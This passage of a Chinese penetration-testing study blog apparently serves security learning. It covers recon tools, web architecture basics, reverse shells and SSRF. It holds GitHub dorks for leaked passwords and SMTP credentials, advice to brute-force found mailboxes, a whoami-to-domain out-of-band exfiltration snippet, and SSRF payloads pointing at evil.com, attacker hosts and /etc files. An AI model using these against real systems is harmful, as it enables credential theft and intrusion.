href="https://github.com/Kento-Sec/AsamF">https://github.com/Kento-Sec/AsamF</a></p><ol><li><p>介绍：AsamF集成了Fofa、Hunter、Quake、Zoomeye、Shodan、爱企查、Chinaz、0.zone、subfinder。AsamF支持Fofa、Hunter、Quake、Zoomeye、Shodan、Chinaz、0.zone配置多个Key。</p></li><li><p>配置：AsamF会在~&#x2F;.config&#x2F;asamf&#x2F;目录下生成config.json文件。</p></li><li><p>使用：见项目文档</p></li></ol></li></ul><p>‍</p><ul><li><p>沏茶（企查）信息</p><p><a href="https://github.com/wgpsec/ENScan_GO">https://github.com/wgpsec/ENScan_GO</a></p><ol><li>介绍：剑指HW&#x2F;SRC，解决在HW&#x2F;SRC场景下遇到的各种针对国内企业信息收集难题</li><li>配置：ENScanGo在第一次使用时需要使用-v命令生成配置文件信息后进行配置</li><li>使用：见项目文档</li></ol></li></ul><p>‍</p><p>综合自动化</p><ul><li><p>ARL灯塔</p><p><a href="https://github.com/ki9mu/ARL-plus-docker">https://github.com/ki9mu/ARL-plus-docker</a></p><ol><li>介绍：旨在快速侦察与目标关联的互联网资产，构建基础资产信息库。 协助甲方安全团队或者渗透测试人员有效侦察和检索资产，发现存在的薄弱点和攻击面。</li><li>配置：（docker搭建）<a href="https://github.com/TophantTechnology/ARL(%E6%AD%A4%E9%93%BE%E6%8E%A5%E5%B7%B2%E7%BB%8F%E6%8C%82%E4%BA%86)">https://github.com/TophantTechnology/ARL(此链接已经挂了)</a></li></ol></li><li><p>Nemo_Go</p><p><a href="https://github.com/hanc00l/nemo_go">https://github.com/hanc00l/nemo_go</a></p><ol><li><p>介绍：Nemo是用来进行自动化信息收集的一个简单平台，通过集成常用的信息收集工具和技术，实现对内网及互联网资产信息的自动收集，提高隐患排查和渗透测试的工作效率，用Golang完全重构了原Python版本。</p></li><li><p>配置：（docker搭建）<a href="https://github.com/hanc00l/nemo_go/blob/main/docs/docker.md">https://github.com/hanc00l/nemo_go/blob/main/docs/docker.md</a></p></li><li><p>Bug：网络空间（配置后要重启）<a href="https://github.com/hanc00l/nemo_go/issues/72">https://github.com/hanc00l/nemo_go/issues/72</a></p></li></ol></li></ul><p>‍</p><p>‍</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>‍</p><h4 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h4><h5 id="对象筛选"><a href="#对象筛选" class="headerlink" title="对象筛选"></a>对象筛选</h5><ol><li>人员</li><li>邮箱</li><li>域名</li><li>名称</li></ol><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">域名+password+<span class="hljs-keyword">in</span>:file<span class="hljs-comment">//in:file是为了控制搜索类型</span><br>baidu<span class="hljs-selector-class">.com</span> password <span class="hljs-keyword">in</span>:file<span class="hljs-comment">//例子</span><br><br>邮箱+password <span class="hljs-keyword">in</span>:file<span class="hljs-comment">//in:file是为了控制搜索类型</span><br>IceCream@<span class="hljs-number">162</span><span class="hljs-selector-class">.com</span> password <span class="hljs-keyword">in</span>:file<span class="hljs-comment">//例子</span><br><br>site:Github<span class="hljs-selector-class">.com</span> smtp  <br>site:Github<span class="hljs-selector-class">.com</span> smtp @qq<span class="hljs-selector-class">.com</span>  <br>site:Github<span class="hljs-selector-class">.com</span> smtp @<span class="hljs-number">126</span><span class="hljs-selector-class">.com</span>  <br>site:Github<span class="hljs-selector-class">.com</span> smtp @<span class="hljs-number">163</span><span class="hljs-selector-class">.com</span>  <br>site:Github<span class="hljs-selector-class">.com</span> smtp @sina<span class="hljs-selector-class">.com</span><span class="hljs-selector-class">.cn</span> <br>site:Github<span class="hljs-selector-class">.com</span> smtp password <br>site:Github<span class="hljs-selector-class">.com</span> String password smtp <br></code></pre></td></tr></table></figure><h5 id="后续监控"><a href="#后续监控" class="headerlink" title="后续监控"></a>后续监控</h5><ol><li><p>gshark</p><p> <a href="https://github.com/madneal/gshark">https://github.com/madneal/gshark</a></p><p> 可以针对一个或者多个项目进行监控</p></li><li><p>FireEyeGoldCrystal</p></li><li><p>Github-Monitor</p><p> <a href="https://github.com/Explorer1092/Github-Monitor">https://github.com/Explorer1092/Github-Monitor</a></p><p> 1.新建任务，输入关键词语法</p><p> 2.选择匹配模式和爬取时间设置</p><p> 3.配置这个项目之后，只要系统一直开机联网就能一直爬取数据，能够一直监控GitHub上的项目</p></li></ol><p>‍</p><h4 id="网盘泄露"><a href="#网盘泄露" class="headerlink" title="网盘泄露"></a>网盘泄露</h4><p>直接搜目标信息—&gt;获取企业招标，人员信息，业务产品，应用源码等</p><p>‍</p><p>‍</p><h4 id="敏感目录文件"><a href="#敏感目录文件" class="headerlink" title="敏感目录文件"></a>敏感目录文件</h4><ol><li><p>字典扫描</p></li><li><p>爬虫</p></li></ol><p>‍</p><h4 id="网络空间进阶"><a href="#网络空间进阶" class="headerlink" title="网络空间进阶"></a>网络空间进阶</h4><ol><li><p>证书收集<br> FOFA搜索</p> <figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">cert</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;域名&quot;</span><br><span class="hljs-attribute">cert</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;sziit.edu.cn&quot;</span>//例子<br></code></pre></td></tr></table></figure><p> Quake</p> <figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">cert</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;域名&quot;</span><br><span class="hljs-attribute">cert</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;sziit.edu.cn&quot;</span>//例子<br></code></pre></td></tr></table></figure><p> Hunter</p> <figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">cert</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;域名&quot;</span><br><span class="hljs-attribute">cert</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;sziit.edu.cn&quot;</span>//例子<br></code></pre></td></tr></table></figure><p> 这种搜索方法的目的就是搜索出使用相同证书的网站，这样扩大信息收集网站的面积</p></li></ol><p>‍</p><ol start="2"><li><p>ICO图标收集<br> 一般直接使用F12在源码中下载</p><ul><li>FOFA搜索<br>下载完ICO文件之后直接在FOFA中上传进行搜索</li><li>Quake<br>下载完ICO文件之后直接在Quake中上传进行搜索</li><li>Hunter<br>下载完ICO文件之后直接在Hunter中上传进行搜索</li></ul><p> 这种搜索方法的目的就是搜索出使用图标的网站，这样扩大信息收集网站的面积</p></li></ol><p>‍</p><ol start="3"><li><p>邮箱资产收集<br> 网址：<a href="https://hunter.io/">https://hunter.io/</a></p><p> 通过域名和邮箱去发现，邮箱可以尝试使用弱口令爆破进行登陆</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>信息打点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息打点</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基础入门🪜</title>
    <link href="/2024/06/27/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"/>
    <url>/2024/06/27/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="基础入门"><a href="#基础入门" class="headerlink" title="基础入门"></a>基础入门</h1><h3 id="Web应用"><a href="#Web应用" class="headerlink" title="Web应用"></a>Web应用</h3><p>‍</p><h4 id="常规模式"><a href="#常规模式" class="headerlink" title="常规模式"></a>常规模式</h4><p>‍</p><h5 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h5><ol><li><strong>内容管理系统（CMS）</strong> ：如WordPress、Drupal、Joomla等。</li><li><strong>电子商务平台</strong>：如Magento、Shopify、WooCommerce等。</li><li><strong>社交媒体平台</strong>：如Facebook、Twitter、LinkedIn等。</li><li><strong>在线银行和金融服务</strong>：如网上银行系统、支付网关、金融交易平台等。</li><li><strong>医疗健康服务平台</strong>：如医院信息系统、健康管理平台等。</li><li><strong>学术教育平台</strong>：如在线学习系统、学术论坛、校园管理系统等。</li><li><strong>政府机构和公共服务平台</strong>：如电子政务系统、公共信息公开平台等。</li><li><strong>在线游戏平台</strong>：如游戏社区、游戏商城、多人在线游戏服务器等。</li><li><strong>文件存储和共享服务</strong>：如云存储服务、在线文档管理系统等。</li><li><strong>物联网（IoT）应用</strong>：如智能家居控制系统、工业物联网平台等。</li></ol><p>‍</p><h5 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h5><ol><li><p><strong>子域名站</strong></p><p> <code>www.baidu.com</code>​</p><p> <code>news.baidu.com</code>​</p></li><li><p><strong>目录站</strong></p><p> <code>https://www.baidu.com/123.php</code>​</p><p> <code>https://www.baidu.com/index.php</code>​</p></li><li><p><strong>端口站</strong></p><p> <code>https://www.baidu.com:8080/</code>​</p><p> <code>https://www.baidu.com:8888/</code>​</p></li></ol><p>‍</p><h5 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h5><ol><li><p><strong>Web服务器</strong>：</p><ul><li>Apache HTTP Server</li><li>Nginx</li><li>Microsoft IIS（Internet Information Services）</li></ul><p> 可能存在的漏洞：目录遍历、文件上传漏洞、未经授权访问、拒绝服务（DoS）攻击</p></li><li><p><strong>应用服务器</strong>：</p><ul><li>Apache Tomcat</li><li>Jetty</li><li>JBoss</li><li>WildFly</li></ul><p> 可能存在的漏洞：认证绕过、目录遍历、远程代码执行</p></li><li><p><strong>消息队列中间件</strong>：</p><ul><li>RabbitMQ</li><li>Apache Kafka</li><li>ActiveMQ</li><li>ZeroMQ</li></ul><p> 可能存在的漏洞：未经授权访问、拒绝服务（DoS）攻击</p></li><li><p><strong>数据库中间件</strong>：</p><ul><li>Hibernate</li><li>MyBatis</li><li>SQLAlchemy</li></ul><p> 可能存在的漏洞：SQL注入、未经授权访问、数据泄露</p></li><li><p><strong>缓存中间件</strong>：</p><ul><li>Redis</li><li>Memcached</li><li>Ehcache</li></ul><p> 可能存在的漏洞：未经授权访问、数据泄露</p></li><li><p><strong>Web服务中间件</strong>：</p><ul><li>SOAP（Simple Object Access Protocol）</li><li>RESTful Web Services</li><li>gRPC</li></ul><p> 可能存在的漏洞：认证绕过、XML注入</p></li><li><p><strong>身份认证和授权中间件</strong>：</p><ul><li>OAuth</li><li>OpenID Connect</li><li>LDAP（Lightweight Directory Access Protocol）</li></ul><p> 可能存在的漏洞：会话劫持、密码重置漏洞</p></li><li><p><strong>反向代理中间件</strong>：</p><ul><li>HAProxy</li><li>Squid</li><li>Varnish Cache</li></ul><p> 可能存在的漏洞：配置错误、拒绝服务漏洞</p></li></ol><h6 id="中间件主要配置功能"><a href="#中间件主要配置功能" class="headerlink" title="中间件主要配置功能"></a>中间件主要配置功能</h6><ul><li>身份验证</li><li>目录权限</li><li>解析规则</li></ul><p>‍</p><h5 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h5><ul><li><h6 id="本地一致"><a href="#本地一致" class="headerlink" title="本地一致"></a>本地一致</h6>网站与数据库均在同服务器</li></ul><p>‍</p><ul><li><h6 id="站库分离"><a href="#站库分离" class="headerlink" title="站库分离"></a>站库分离</h6><ul><li><p>数据库放在与源码不同的服务器</p></li><li><p>云数据库应用OSS</p></li></ul></li></ul><p>影响：数据被单独存放，能连接才可影响数据</p><p>‍</p><p>‍</p><h5 id="程序源码"><a href="#程序源码" class="headerlink" title="程序源码"></a>程序源码</h5><ol><li><p>类型</p><ul><li><p>开源</p><ul><li><p>代码可看</p></li><li><p>闭源（加密，语言特性）</p></li></ul></li><li><p>商业</p></li><li><p>自制</p></li></ul></li><li><p>结构组成</p><ul><li>数据库目录</li><li>后台目录</li><li>文件目录</li></ul></li><li><p>路由访问</p><ul><li><p>常规访问（相对&#x2F;绝对路径）</p></li><li><p>根据路由配置访问</p></li></ul></li></ol><p>‍</p><p>‍</p><p>‍</p><h4 id="其他模式"><a href="#其他模式" class="headerlink" title="其他模式"></a>其他模式</h4><h5 id="常规化"><a href="#常规化" class="headerlink" title="常规化"></a>常规化</h5><ul><li><p>原理</p><p>源码和数据都在同服务器</p></li><li><p>影响</p><p>无，常规安全测试手法即可</p></li></ul><p>‍</p><h5 id="站库分离-1"><a href="#站库分离-1" class="headerlink" title="站库分离"></a>站库分离</h5><ul><li><p>原理</p><p>源码数据都在不同服务器</p></li><li><p>存储</p><p>其他服务器上数据库&amp;云数据库产品</p></li><li><p>影响</p><p>数据被单独存放，能连接才可影响数据</p></li></ul><p>‍</p><h5 id="前后端分离"><a href="#前后端分离" class="headerlink" title="前后端分离"></a>前后端分离</h5><ul><li><h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><p>前端js框架，通过API传输数据到后端</p></li><li><h6 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h6><ol><li>前端(HTML,JavaScript)页面大部分不存在漏洞</li><li>后端(php,java,.net)管理大部分不在同域名</li><li>获得权限有可能不影响后端</li></ol></li></ul><p>‍</p><h5 id="集成软件"><a href="#集成软件" class="headerlink" title="集成软件"></a>集成软件</h5><ul><li><p>原理</p><p>打包类集成环境(宝塔,phpstudy)，权限配置或受控制</p></li><li><p>影响</p><p>攻击者权限对比区别，宝塔搭建的一般会设置好安全有关权限，phpstudy和常规源码搭建的需要自行设置</p></li></ul><p>‍</p><h5 id="Docker容器"><a href="#Docker容器" class="headerlink" title="Docker容器"></a>Docker容器</h5><ul><li><p>原理</p><p>虚拟化技术独立磁盘空间，非真实物理环境</p></li><li><p>影响</p><p>攻击者虚拟空间磁盘， —–挖坑：攻击者拿下docker搭建的应用，由于是虚拟化空间搭建的所以造成不了实质性危害，此时需要进行<u><a href="%E7%8E%B0%E5%9C%A8%E8%BF%98%E6%B2%A1%E5%AD%A6%E5%88%B0%EF%BC%8C%E4%B9%8B%E5%90%8E%E8%87%AA%E5%B7%B1%E8%BF%87%E6%9D%A5%E5%A1%AB%E5%9D%91">docker逃逸</a></u></p></li><li><p>教程</p><p><a href="https://www.w3cschool.cn/docker/">Docker 教程_w3cschool</a></p></li></ul><p>‍</p><h5 id="建站平台"><a href="#建站平台" class="headerlink" title="建站平台"></a>建站平台</h5><ul><li><p>模式</p><ol><li>托管</li><li>申请</li></ol></li><li><p>原理</p><p>利用别人域名模板建立</p></li><li><p>影响</p><p>安全测试非目标资产，<u>简称白费劲</u>，进行信息搜集时要注意</p></li></ul><p>‍</p><h5 id="静态"><a href="#静态" class="headerlink" title="静态"></a>静态</h5><ul><li><p>原理</p><p>没有后端，数据没有传输性，修改页面只能从源代码里面改</p></li><li><p>影响</p><p>无</p></li></ul><p>‍</p><h5 id="动态"><a href="#动态" class="headerlink" title="动态"></a>动态</h5><ul><li><p>原理</p><p>通过JavaScript等技术实现交互性和动态更新</p></li></ul><p>‍</p><p>‍</p><h5 id="伪静态"><a href="#伪静态" class="headerlink" title="伪静态"></a>伪静态</h5><ul><li>动态转为静态的技术，伪装的静态</li></ul><p>具体对静态和非静态的总结如下：<a href="https://developer.aliyun.com/article/1364428">到底什么是伪静态？为什么要做伪静态？-阿里云开发者社区 (aliyun.com)</a></p><p><a href="https://blog.csdn.net/weixin_74545026/article/details/139559830?spm=1001.2014.3001.5501">伪静态—url重定向去除动态页面参数</a></p><p>‍</p><h4 id="拓展模式"><a href="#拓展模式" class="headerlink" title="拓展模式"></a>拓展模式</h4><h5 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h5><ul><li><p>原理</p><p>Web应用防火墙，防护保护web</p></li><li><p>影响</p><p>会拦截安全测试手法</p></li></ul><p><img src="/assets/image-20240511035220-wckjhel.png" alt="image">​</p><p><img src="/assets/image-20240511035232-4i4kf9j.png" alt="image">​</p><p>‍</p><h5 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h5><ul><li><p>原理</p><p>内容分发服务，提高访问速度（类似建5G基站）</p></li><li><p>影响</p><p>隐藏真实ip，导致信息搜集目标错误</p></li></ul><p><img src="/assets/image-20240625224301-t1buauf.png" alt="image">​</p><p>‍</p><h5 id="OSS"><a href="#OSS" class="headerlink" title="OSS"></a>OSS</h5><ul><li><p>原理</p><p>云储存服务，提高资源文件加载速度</p></li><li><p>影响</p><ol><li>资源单独存储，修复上传漏洞</li><li>文件解析不复存在</li><li>同时会有Accesskey泄露安全漏洞</li></ol></li></ul><p><img src="/assets/image-20240511035329-d6a4fr7.png" alt="image">​</p><p>‍</p><h5 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h5><ul><li><p>原理</p><p>通过网络反向代理转发真实服务达到访问目的，通俗点说就是<u>服务端必须主动把流量给到你的代理服务器你才可以通过服务器访问到服务端</u></p></li><li><p>影响</p><p>访问目标只是一个代理，而非真实应用服务器，就是存在重定向</p></li></ul><p><img src="/assets/image-20240625224648-hkbfnpk.png" alt="image">​</p><p>‍</p><h5 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h5><ul><li><p>原理</p><p>分摊到多个操作单元上执行，共同完成任务</p></li><li><p>影响</p><p>有多个服务器加载服务，测试过程中会存在多个目标</p></li></ul><p><img src="/assets/image-20240625224736-p6s43hl.png" alt="image">​</p><p>‍</p><p>‍</p><h3 id="APP应用"><a href="#APP应用" class="headerlink" title="APP应用"></a>APP应用</h3><p>‍</p><h4 id="1-原生开发"><a href="#1-原生开发" class="headerlink" title="1. 原生开发"></a>1. 原生开发</h4><p>安卓一般使用java,现在也有kotlin</p><ul><li><h5 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h5></li><li><h5 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h5></li></ul><p>‍</p><h4 id="2-封装平台"><a href="#2-封装平台" class="headerlink" title="2. 封装平台"></a>2. 封装平台</h4><ul><li><p>ShopXO源码程序（宝塔）+一门APP打包</p><p>常规测试即可</p></li><li><p>H5&amp;Vue-HBuilderX</p><p>API&amp;JS框架安全问题&amp;JS前端测试</p></li><li><h5 id="本身就是Web"><a href="#本身就是Web" class="headerlink" title="本身就是Web"></a>本身就是Web</h5><p>就是web加了一个app的壳,进行常规测试即可</p></li></ul><p>‍</p><h4 id="3-H5-Vue"><a href="#3-H5-Vue" class="headerlink" title="3. H5&amp;Vue"></a>3. H5&amp;Vue</h4><p>使用H5开发可以实现多端复用</p><h5 id="前后端分离-1"><a href="#前后端分离-1" class="headerlink" title="前后端分离"></a>前后端分离</h5><ul><li>JS渗透</li><li>接口安全</li><li>框架安全</li></ul><p>‍</p><h4 id="4-Flutter"><a href="#4-Flutter" class="headerlink" title="4. Flutter"></a>4. Flutter</h4><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>谷歌推出出的UI框架,使用dart进行开发,支持跨平台</p><p>‍</p><p>‍</p><h3 id="小程序应用"><a href="#小程序应用" class="headerlink" title="小程序应用"></a>小程序应用</h3><p>‍</p><h4 id="1-封装平台"><a href="#1-封装平台" class="headerlink" title="1. 封装平台"></a>1. 封装平台</h4><ul><li><p>本身就是Web</p><p>常规的web测试</p></li></ul><p>‍</p><h4 id="2-H5-Vue"><a href="#2-H5-Vue" class="headerlink" title="2. H5&amp;Vue"></a>2. H5&amp;Vue</h4><h5 id="前后端分离-2"><a href="#前后端分离-2" class="headerlink" title="前后端分离"></a>前后端分离</h5><ul><li>JS渗透</li><li>接口安全</li><li>框架安全</li></ul><h5 id="前后端分离-3"><a href="#前后端分离-3" class="headerlink" title="前后端分离"></a>前后端分离</h5><p>‍</p><h3 id="云上应用"><a href="#云上应用" class="headerlink" title="云上应用"></a>云上应用</h3><p>‍</p><h3 id="命令-反弹-带外"><a href="#命令-反弹-带外" class="headerlink" title="命令&amp;反弹&amp;带外"></a>命令&amp;反弹&amp;带外</h3><p>‍</p><ol><li><h4 id="基础命令执行"><a href="#基础命令执行" class="headerlink" title="基础命令执行"></a>基础命令执行</h4><p> <a href="https://blog.csdn.net/weixin_43303273/article/details/83029138?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522171790620216800186582862%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=171790620216800186582862&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-83029138-null-null.nonecase&amp;utm_term=web%E5%85%A5%E9%97%A8&amp;spm=1018.2226.3001.4450">web安全入门篇-渗透测试中常用的命令</a></p></li><li><h4 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h4><ul><li><p>在线生成—–<a href="https://forum.ywhack.com/bountytips.php?download">棱角社区</a></p></li><li><p>系统分类</p><ul><li>linux——<code>wget</code>​,<code>curl</code>​,<code>python</code>​,<code>ruby</code>​,<code>perl</code>​,<code>java</code>​</li><li>windows——<code>PowerShell</code>​,<code>Certutil</code>​,<code>Bitsadmin</code>​,<code>msiexec</code>​,<code>mshta</code>​,<code>rundll32</code>​</li></ul></li></ul></li><li><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p> 含义:控制目标之后,构建一个稳定的通信后门</p><ul><li><p>好处：实现反弹shell之后,可以一直保持执行命令,并且相当于在本地执行,不会产生流量</p></li><li><p>没有实现反弹shell的坏处：每次执行命令都需要重新获取权限,并且是通过网络传输命令,,所以会一直产生流量,更容易被溯源</p></li><li><p>在线生成</p></li><li><p>连接方向</p><p><img src="/assets/image-20240824163428-qsrr7on.png" alt="image">​</p></li></ul></li><li><h4 id="数据回显-带外查询"><a href="#数据回显-带外查询" class="headerlink" title="数据回显-带外查询"></a>数据回显-带外查询</h4></li></ol><p>Linux具有&#96;&#96;符,可以带外回显</p><p>Windows不具有&#96;&#96;符，，无法带外回显，但是可以使用Windows的变量赋值实现</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">使用方法：<br><span class="hljs-variable">$x</span>=whoami;<span class="hljs-regexp">//</span>将whoami命令赋值给x<br><span class="hljs-variable">$y</span>=<span class="hljs-string">&#x27;.目标地址&#x27;</span>;  <span class="hljs-regexp">//</span>将目标地址赋值给y<br><span class="hljs-variable">$z</span>=<span class="hljs-variable">$x</span>+<span class="hljs-variable">$y</span>;<span class="hljs-regexp">//</span>将两个变量的结果加起来赋值给z<br>echo <span class="hljs-variable">$z</span>;<span class="hljs-regexp">//</span>回显<span class="hljs-variable">$z</span>命令执行的结果<br><span class="hljs-variable">$xx</span>=<span class="hljs-variable">$x</span>.replace(<span class="hljs-string">&#x27;\&#x27;,&#x27;</span>xxxx<span class="hljs-string">&#x27;);//使用变量赋值对斜杠进行替换</span><br></code></pre></td></tr></table></figure><p>‍</p><h3 id="抓包-1"><a href="#抓包-1" class="headerlink" title="抓包"></a>抓包</h3><h4 id="1-Web网页"><a href="#1-Web网页" class="headerlink" title="1. Web网页"></a>1. Web网页</h4><p>需要在软件上导出<a href="https://so.csdn.net/so/search?q=CA%E8%AF%81%E4%B9%A6&spm=1001.2101.3001.7020">CA证书</a>，在浏览器上进行安装，然后设置真机代理服务器还有软件的代理服务器IP和端口号之后才能进行监听抓取数据包</p><h4 id="2-手机app"><a href="#2-手机app" class="headerlink" title="2. 手机app"></a>2. 手机app</h4><p>安装证书，单独设备，设备具有单独IP，抓包之前也需要单独配置代理服务器</p><h4 id="3-小程序"><a href="#3-小程序" class="headerlink" title="3. 小程序"></a>3. 小程序</h4><p>设置Proxifier进行代理转发到Burp抓取到数据包，或者使用Charles&amp;Burp进行转发联动</p><h4 id="4-PC应用"><a href="#4-PC应用" class="headerlink" title="4. PC应用"></a>4. PC应用</h4><p>设置Proxifier进行代理转发到Burp抓取到数据包，或者使用Charles&amp;Burp进行转发联动</p><p>‍</p><h3 id="加解密算法"><a href="#加解密算法" class="headerlink" title="加解密算法"></a>加解密算法</h3><ul><li>加解密算法—–<a href="https://mp.weixin.qq.com/s?__biz=MzAwNDcxMjI2MA==&mid=2247484455&idx=1&sn=e1b4324ddcf7d6123be30d9a5613e17b&chksm=9b26f60cac517f1a920cf3b73b3212a645aeef78882c47957b9f3c2135cb7ce051c73fe77bb2&mpshare=1&scene=23&srcid=1111auAYWmr1N0NAs9Wp2hGz&sharer_sharetime=1605145141579&sharer_shareid=5051b3eddbbe2cb698aedf9452370026#rd">特征分析</a></li><li><a href="https://blog.csdn.net/qq_41638851/article/details/100526839">CTF中常见密码题解密网站总结</a></li><li><a href="https://blog.csdn.net/qq_40837276/article/details/83080460">CTF密码学常见加密解密总结</a></li></ul><p>‍</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>基础入门</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础入门</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSRF漏洞🦂</title>
    <link href="/2024/04/26/SSRF%E6%BC%8F%E6%B4%9E%F0%9F%A6%82/"/>
    <url>/2024/04/26/SSRF%E6%BC%8F%E6%B4%9E%F0%9F%A6%82/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>SSRF (Server-Side Request Forgery,服务器端请求伪造)是一种由攻击者构造请求，由<strong>服务端发起请求的安全漏洞</strong>。一般情况下，SSRF 攻击的目标是外网无法访问的内部系统(<strong>正因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔离的内部系统</strong>)。</p><p>SSRF 的形成大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p><p><img src="/assets/image-20240406154002-bqj74km.png" alt="image">​</p><p>‍</p><h1 id="SSRF和CSRF的区别"><a href="#SSRF和CSRF的区别" class="headerlink" title="SSRF和CSRF的区别"></a>SSRF和CSRF的区别</h1><p>CSRF是服务器端没有对用户提交的数据进行随机值校验，且对http请求包内的refer字段校验不严，导致攻击者可以利用用户的cookie信息伪造用户请求发送至服务器；</p><p>SSRF是服务器对用户提供的可控URL过于信任，没有对攻击者提供的URL进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或者其它服务器</p><p>‍</p><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>‍</p><p>优质文章:<a href="https://www.freebuf.com/articles/web/260806.html">CTF SSRF 漏洞从0到1 - FreeBuf网络安全行业门户</a></p><p>‍</p><h2 id="SSRF支持的协议"><a href="#SSRF支持的协议" class="headerlink" title="SSRF支持的协议"></a>SSRF支持的协议</h2><p>存在ssrf漏洞的站点主要利用四个协议</p><blockquote><p>http http协议拿来进行内网的ip扫描、端口探测，如果探测到6379端口，那么可以利 用http、gopher、dict这几个协议来打开放6379端口的redis服务</p><p>gopher</p><p>file 可以拿来进行本地文件的读取</p><p>dict协议 可以拿来探测端口</p></blockquote><ul><li><p>http:&#x2F;&#x2F; 协议  — 能进行内网端口探测-可以通过返回的时间和长度判断端口的开放。</p><p>ssrf.php?url&#x3D;<a href="http://127.0.0.1:3306/">http://127.0.0.1:3306</a></p></li><li><p>ftp:&#x2F;&#x2F; 协议 —</p><p>ssrf.php?url&#x3D;<a href="ftp://evil.com:12345/TEST">ftp://evil.com:12345/TEST</a></p></li><li><p>file:&#x2F;&#x2F; 协议</p><p>ssrf.php?url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;password</p></li><li><p>Dict:&#x2F;&#x2F; 协议</p><p>dict:&#x2F;&#x2F;<user-auth>@<host>:<port>&#x2F;d:<word></p><p>ssrf.php?url&#x3D;dict:&#x2F;&#x2F;attacker:11111&#x2F;</p></li><li><p>SFTP:&#x2F;&#x2F; 协议</p><p>ssrf.php?url&#x3D;s<a href="ftp://example.com:11111/">ftp://example.com:11111/</a></p></li><li><p>TFTP:&#x2F;&#x2F; 协议</p><p>ssrf.php?url&#x3D;t<a href="ftp://example.com:12346/TESTUDPPACKET">ftp://example.com:12346/TESTUDPPACKET</a></p></li><li><p>LDAP:&#x2F;&#x2F; 协议</p><p>ssrf.php?url&#x3D;ldap:&#x2F;&#x2F;localhost:11211&#x2F;%0astats%0aquit</p></li><li><p>Gopher:&#x2F;&#x2F; 协议</p><p>ssrf.php?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:3306</p></li></ul><p>‍</p><h2 id="正反向连接"><a href="#正反向连接" class="headerlink" title="正反向连接"></a>正反向连接</h2><p><img src="/assets/image-20240824163428-qsrr7on.png" alt="image">​</p><p>‍</p><p>‍</p><h2 id="内网IP段"><a href="#内网IP段" class="headerlink" title="内网IP段"></a>内网IP段</h2><ul><li>C类：192.168.0.0 - 192.168.255.255</li><li>B类：172.16.0.0 - 172.31.255.255</li><li>A类：10.0.0.0 - 10.255.255.255</li></ul><p>‍</p><p>‍</p><p>‍</p><h1 id="如何测试"><a href="#如何测试" class="headerlink" title="如何测试"></a>如何测试</h1><h2 id="黑盒"><a href="#黑盒" class="headerlink" title="黑盒"></a>黑盒</h2><h3 id="SSRF和文件包含黑盒如何区分？"><a href="#SSRF和文件包含黑盒如何区分？" class="headerlink" 